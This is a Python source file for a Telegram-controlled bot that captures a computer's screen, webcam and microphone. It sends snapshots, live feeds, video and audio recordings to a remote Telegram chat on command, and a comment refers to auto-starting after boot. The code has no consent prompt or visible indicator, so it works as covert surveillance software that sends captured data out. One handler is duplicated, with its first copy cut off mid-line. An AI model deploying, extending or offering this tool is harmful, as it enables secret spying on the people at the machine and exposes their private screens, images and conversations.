import time
import asyncio
import cv2
import numpy as np
import pyautogui
from telegram import Update, InputMediaPhoto
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import datetime
import os
import hashlib
import sounddevice as sd
import soundfile as sf
import threading

# ===== AUTO START DELAY =====
time.sleep(0)  # recommended 10-15 minutes for after boot to make sure its connected to wifi so it does not crash

# ===== CONFIG =====
from config import TOKEN, CHAT_ID
BASE_FPS = 0.5
HIGH_FPS = 15
motion_threshold = 5000
motion_enabled = True

webcam_size = [160, 120]
webcam = cv2.VideoCapture(0)
DOWNSCALE = 0.5

# Streaming & recording states
screen_streaming = False
webcam_streaming = False
screen_recording = False
webcam_recording = False
screen_writer = None
webcam_writer = None

# Microphone recording
mic_recording = False
mic_file = None

# Telegram message IDs
live_screen_msg_id = None
live_webcam_msg_id = None

# Last frame hashes
last_screen_hash = None
last_webcam_hash = None

SCREEN_TEMP_FILE = "screen_temp.jpg"
WEBCAM_TEMP_FILE = "webcam_temp.jpg"

# ===== HELP MENU FUNCTION =====
async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
 TELEGRAM LIVE STREAM BOT COMMANDS 

/startscreen      - Start live screen feed
/stopscreen       - Stop live screen feed
/startwebcam      - Start live webcam feed
/stopwebcam       - Stop live webcam feed
/recordscreen     - Start recording screen feed
/recordwebcam     - Start recording webcam feed
/stoprecord       - Stop recording and send video
/recordmic        - Start recording microphone
/stopmic          - Stop mic recording and send audio
/fps <n>          - Set base FPS
/togglemotion     - Enable/disable motion detection
/snapshot         - Capture screen + webcam
/snapweb          - Capture webcam only
/snapscreen       - Capture screen only
/help             - Show this help menu
""")


# ===== UTILITY FUNCTIONS =====
def frame_hash(frame_path):
    with open(frame_path, "rb") as f:
        data = f.read()
        return hashlib.md5(data).hexdigest()

def record_mic(filename, samplerate=44100, channels=1):
    global mic_recording
    mic_recording = True
    with sf.SoundFile(filename, mode='w', samplerate=samplerate, channels=channels) as file:
        with sd.InputStream(samplerate=samplerate, channels=channels,
                            callback=lambda indata, frames, time, status: file.write(indata)):
            while mic_recording:
                sd.sleep(100)

# ===== SNAPSHOT FUNCTIONS =====
async def send_frame(context, both=False, webcam_only=False, screen_only=False):
    frame = None
    if both or screen_only:
        frame = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
    if both or webcam_only:
        ret, cam_frame = webcam.read()
        if not ret:
            cam_frame = np.zeros((webcam_size[1], webcam_size[0], 3), dtype=np.uint8)
        if both:
            h, w, _ = cam_frame.shape
            frame[0:h, 0:w] = cam_frame
        else:
            frame = cam_frame
    frame = cv2.resize(frame, (0,0), fx=DOWNSCALE, fy=DOWNSCALE)
    temp_file = "temp_snapshot.jpg"
    cv2.imwrite(temp_file, frame)
    await context.bot.send_photo(chat_id=CHAT_ID, photo=open(temp_file, "rb"))
    os.remove(temp_file)

async def snapshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_frame(context, both=True)
async def snap_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_frame(context, webcam_only=True)
async def snap_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_frame(context, screen_only=True)

# ===== LIVE STREAM FUNCTIONS =====
async def live_screen_feed(context):
    global screen_streaming, live_screen_msg_id, last_screen_hash, screen_writer
    last_gray = None
    live_screen_msg_id = None

    if screen_recording:
        filename = f"screen_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        screen_writer = cv2.VideoWriter(filename, fourcc, BASE_FPS, (pyautogui.size().width, pyautogui.size().height))
        context.bot_data['screen_file'] = filename

    while screen_streaming:
        screen = pyautogui.screenshot()
        screen = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)

        # Motion detection
        motion_detected = False
        gray = cv2.cvtColor(screen, cv2.COLOR_BGR2GRAY)
        gray = cv2.GaussianBlur(gray, (21,21), 0)
        if motion_enabled and last_gray is not None:
            diff = cv2.absdiff(last_gray, gray)
            _, thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)
            motion = np.sum(thresh) / 255
            if motion > motion_threshold:
                motion_detected = True
        last_gray = gray

        if screen_recording and screen_writer is not None:
            screen_writer.write(screen)

        cv2.putText(screen, datetime.datetime.now().strftime("%H:%M:%S.%f"), (1, 10),
                    cv2.FONT_HERSHEY_SIMPLEX, 0.3, (0,0,0), 1)
        cv2.imwrite(SCREEN_TEMP_FILE, screen)
        current_hash = frame_hash(SCREEN_TEMP_FILE)

        if current_hash != last_screen_hash:
            try:
                if live_screen_msg_id is None:
                    msg = await context.bot.send_photo(chat_id=CHAT_ID, photo=open(SCREEN_TEMP_FILE, "rb"))
                    live_screen_msg_id = msg.message_id
                else:
                    await context.bot.edit_message_media(chat_id=CHAT_ID, message_id=live_screen_msg_id,
                                                         media=InputMediaPhoto(open(SCREEN_TEMP_FILE, "rb")))
            except Exception as e:
                print(f"Screen feed error: {e}")
            last_screen_hash = current_hash

        await asyncio.sleep(1/(HIGH_FPS if motion_detected else BASE_FPS))

    if screen_writer is not None:
        screen_writer.release()
        screen_writer = None

async def live_webcam_feed(context):
    global webcam_streaming, live_webcam_msg_id, webcam_writer, last_webcam_hash
    live_webcam_msg_id = None

    if webcam_recording:
        filename = f"webcam_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        webcam_writer = cv2.VideoWriter(filename, fourcc, BASE_FPS, (webcam_size[0], webcam_size[1]))
        context.bot_data['webcam_file'] = filename

    while webcam_streaming:
        ret, cam_frame = webcam.read()
        if not ret:
            cam_frame = np.zeros((webcam_size[1], webcam_size[0], 3), dtype=np.uint8)

        if webcam_recording and webcam_writer is not None:
            webcam_writer.write(cam_frame)

        cv2.putText(cam_frame, datetime.datetime.now().strftime("%H:%M:%S.%f"), (1,10),
                    cv2.FONT_HERSHEY_SIMPLEX, 0.3, (0,0,0), 1)
        cv2.imwrite(WEBCAM_TEMP_FILE, cam_frame)
        current_hash = frame_hash(WEBCAM_TEMP_FILE)

        if current_hash != last_webcam_hash:
            try:
                if live_webcam_msg_id is None:
                    msg = await context.bot.send_photo(chat_id=CHAT_ID, photo=open(WEBCAM_TEMP_FILE, "rb"))
                    live_webcam_msg_id = msg.message_id
                else:
                    await context.bot.edit_message_media(chat_id=CHAT_ID, message_id=live_webcam_msg_id,
                                                         media=InputMediaPhoto(open(WEBCAM_TEMP_FILE, "rb")))
            except Exception as e:
                print(f"Webcam feed error: {e}")
            last_webcam_hash = current_hash

        await asyncio.sleep(1/BASE_FPS)

    if webcam_writer is not None:
        webcam_writer.release()
        webcam_writer = None

# ===== START/STOP HANDLERS =====
async def start_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screen_streaming
    if screen_streaming:
        await update.message.reply_text("Screen feed already running 😏")
        return
    screen_streaming = True
    await update.message.reply_text("🔥 Screen live feed started!")
    asyncio.create_task(live_screen_feed(context))

async def stop_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screen_streaming
    screen_streaming = False
    await update.message.reply_text("❌ Screen feed stopped!")

async def start_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global webcam_streaming
    if webcam_streaming:
        await update.message.reply_text("Webcam feed already running 😏")
        return
    webcam_streaming = True
    await update.message.reply_text("🔥 Webcam live feed started!")
    asyncio.create_task(live_webcam_feed(context))

async def stop_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global webcam_streaming
    webcam_streaming = False
    await update.message

async def stop_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global webcam_streaming
    webcam_streaming = False
    await update.message.reply_text("❌ Webcam feed stopped!")

# ===== RECORDING HANDLERS =====
async def record_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screen_recording
    if screen_recording:
        await update.message.reply_text("Screen recording already running 😏")
        return
    screen_recording = True
    await update.message.reply_text("🎥 Started screen recording!")

async def record_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global webcam_recording
    if webcam_recording:
        await update.message.reply_text("Webcam recording already running 😏")
        return
    webcam_recording = True
    await update.message.reply_text("🎥 Started webcam recording!")

async def stop_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screen_recording, webcam_recording, screen_writer, webcam_writer
    screen_recording = False
    webcam_recording = False

    if screen_writer is not None:
        screen_writer.release()
        screen_writer = None
        filename = context.bot_data.get('screen_file')
        if filename and os.path.exists(filename):
            await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
            os.remove(filename)

    if webcam_writer is not None:
        webcam_writer.release()
        webcam_writer = None
        filename = context.bot_data.get('webcam_file')
        if filename and os.path.exists(filename):
            await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
            os.remove(filename)

    await update.message.reply_text("❌ Recording stopped and sent!")

# ===== MICROPHONE HANDLERS =====
async def record_mic_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global mic_recording, mic_file
    if mic_recording:
        await update.message.reply_text("Mic already recording 😏")
        return
    mic_file = f"mic_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
    thread = threading.Thread(target=record_mic, args=(mic_file,))
    thread.start()
    await update.message.reply_text("🎤 Started mic recording!")

async def record_mic_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global mic_recording, mic_file
    if not mic_recording:
        await update.message.reply_text("Mic recording not running 😏")
        return
    mic_recording = False
    await asyncio.sleep(1)  # wait a bit to finalize file
    if mic_file and os.path.exists(mic_file):
        await context.bot.send_document(chat_id=CHAT_ID, document=open(mic_file, "rb"))
        os.remove(mic_file)
    await update.message.reply_text("❌ Mic recording stopped and sent!")

# ===== FPS / MOTION HANDLERS =====
async def set_fps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BASE_FPS
    try:
        n = float(context.args[0])
        if n <= 0:
            raise ValueError
        BASE_FPS = n
        await update.message.reply_text(f"⚡ Base FPS set to {BASE_FPS}")
    except:
        await update.message.reply_text("Usage: /fps <number>")

async def toggle_motion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global motion_enabled
    motion_enabled = not motion_enabled
    status = "enabled" if motion_enabled else "disabled"
    await update.message.reply_text(f"Motion detection {status} ✅")

# ===== MAIN APP =====
app = ApplicationBuilder().token(TOKEN).build()

# Command handlers
app.add_handler(CommandHandler("help", show_help))
app.add_handler(CommandHandler("fps", set_fps))
app.add_handler(CommandHandler("togglemotion", toggle_motion))
app.add_handler(CommandHandler("snapshot", snapshot))
app.add_handler(CommandHandler("snapweb", snap_web))
app.add_handler(CommandHandler("snapscreen", snap_screen))
app.add_handler(CommandHandler("startscreen", start_screen))
app.add_handler(CommandHandler("stopscreen", stop_screen))
app.add_handler(CommandHandler("startwebcam", start_webcam))
app.add_handler(CommandHandler("stopwebcam", stop_webcam))
app.add_handler(CommandHandler("recordscreen", record_screen))
app.add_handler(CommandHandler("recordwebcam", record_webcam))
app.add_handler(CommandHandler("stoprecord", stop_record))
app.add_handler(CommandHandler("recordmic", record_mic_start))
app.add_handler(CommandHandler("stopmic", record_mic_stop))
print()
print()
print("🔥 Bot running Use /help in telegram for commands.")
app.run_polling()
